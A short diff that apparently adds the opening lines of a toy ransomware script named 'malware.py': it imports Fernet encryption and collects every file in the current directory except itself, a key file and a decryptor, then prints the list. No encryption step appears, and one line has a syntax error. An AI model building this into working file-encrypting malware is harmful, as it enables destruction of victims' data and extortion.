@@ -1,9 +1,14 @@
+#!/usr/bin/env python3
 
+import os
+from cryptography.fernet import Fernet
 
-
-
-
-
+allfiles = []
+for file in os.listdir():
+	if file == "malware.py" or file == "key.key" or file == "decr.py":
+		 continue
+	if os.path.isfile(file)
+		allfiles.append(file)
 
 print(allfiles)
 
